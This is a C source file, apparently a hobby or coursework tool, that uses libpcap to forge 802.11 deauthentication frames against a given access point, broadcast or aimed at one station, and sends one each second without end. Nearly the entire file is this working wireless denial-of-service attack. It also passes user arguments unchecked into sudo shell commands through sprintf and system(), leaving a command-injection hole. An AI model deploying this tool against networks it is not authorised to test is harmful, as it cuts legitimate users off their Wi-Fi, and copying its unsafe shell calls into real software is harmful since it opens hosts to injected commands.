#include <pcap.h>
#include <stdbool.h>
#include <stdio.h>

void usage() {
    printf("syntax: pcap-test <interface> -ap <BssId>\n");
	printf("sample: pcap-test wlan0\n");
}

typedef struct {
	char* dev_;
} Param;

Param param = {
	.dev_ = NULL
};

bool parse(Param* param, int argc, char* argv[]) {
    if (argc < 4) {
		usage();
		return false;
	}
	param->dev_ = argv[1];
	return true;
}
#pragma pack(push,1)

typedef struct {
    uint8_t Header_revision;
    uint8_t Header_pad;
    uint16_t Header_length;
    uint32_t Present_flags;
    uint16_t TX_flags;
    uint8_t retries;
}Radiotap_Header;

typedef struct {
    uint16_t Frame_Control_Field;
    uint16_t duration;
    uint8_t Destination_address[6];
    uint8_t Source_address[6];
    uint8_t Bssid[6];
    uint8_t Fragment_number : 4;
    uint16_t Sequence_number : 12;

}Deauthentication;


typedef struct {
    uint16_t reason_code;

}Wireless_Management;

#pragma pack(pop)

void init(char interface[])
{
    // 모니터 모드로 변경

    char command[100];
    sprintf(command, "sudo ifconfig %s down", interface);
    system(command);
    sprintf(command, "sudo iwconfig %s mode monitor", interface);
    system(command);
    sprintf(command, "sudo ifconfig %s up", interface);
    system(command);
}

void change_channel(char interface[], char channel[])
{
    char command[100];
    sprintf(command, "sudo iwconfig %s ch %s", interface, channel);
    system(command);
}

int main(int argc, char* argv[]) {
	if (!parse(&param, argc, argv))
		return -1;

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
		return -1;
	}
    init(argv[1]);
    Radiotap_Header *radio;
    Deauthentication * deauth;
    Wireless_Management * manage;


    char packet[sizeof(Radiotap_Header)+sizeof(Deauthentication)+sizeof(Wireless_Management)];
    radio = (Radiotap_Header*)packet;
    deauth = (Deauthentication*)(packet+sizeof(Radiotap_Header));
    manage = (Wireless_Management*)(packet+sizeof(Radiotap_Header)+sizeof(Deauthentication));

    radio->Header_revision = 0x0;
    radio->Header_pad = 0x0;
    radio->Header_length = 11;
    radio->Present_flags = 0x28000;
    radio->TX_flags = 0x0;
    radio->retries = 0x0;


    deauth->Frame_Control_Field = htons(0xc000);
    deauth->duration = 0x0;

    sscanf(argv[3],"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &deauth->Bssid[0], &deauth->Bssid[1], &deauth->Bssid[2],
           &deauth->Bssid[3], &deauth->Bssid[4], &deauth->Bssid[5]);

    deauth->Fragment_number = 0x0;
    deauth->Sequence_number = 0x0;
    manage->reason_code = 0x007;

    if (argc > 4 &&  (!strcmp(argv[4], "-stn")))
    {

        sscanf(argv[3],"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",&deauth->Destination_address[0], &deauth->Destination_address[1], &deauth->Destination_address[2], &deauth->Destination_address[3], &deauth->Destination_address[4], &deauth->Destination_address[5]);
        sscanf(argv[5],"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",&deauth->Source_address[0], &deauth->Source_address[1], &deauth->Source_address[2], &deauth->Source_address[3], &deauth->Source_address[4], &deauth->Source_address[5]);
    }
    else
    {

        memset(deauth->Destination_address, 0xff,6);
        sscanf(argv[3],"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",&deauth->Source_address[0], &deauth->Source_address[1], &deauth->Source_address[2], &deauth->Source_address[3], &deauth->Source_address[4], &deauth->Source_address[5]);
    }
    if (argc > 5 && (!strcmp(argv[4], "-c")))
    {

        change_channel(argv[1], argv[5]);
    }else if (argc > 7 && (!strcmp(argv[6], "-c")))
    {

        change_channel(argv[1], argv[7]);
    }


    int cnt = 1;
    while (true)
    {
        pcap_sendpacket(pcap,packet,sizeof(packet));
        printf("%d.\tDeAuth [%02X:%02X:%02X:%02X:%02X:%02X] -> [%02X:%02X:%02X:%02X:%02X:%02X]\n", cnt++, deauth->Source_address[0], deauth->Source_address[1], deauth->Source_address[2], deauth->Source_address[3], deauth->Source_address[4], deauth->Source_address[5], deauth->Destination_address[0], deauth->Destination_address[1], deauth->Destination_address[2], deauth->Destination_address[3], deauth->Destination_address[4], deauth->Destination_address[5]);
        sleep(1);

	}


	pcap_close(pcap);
}
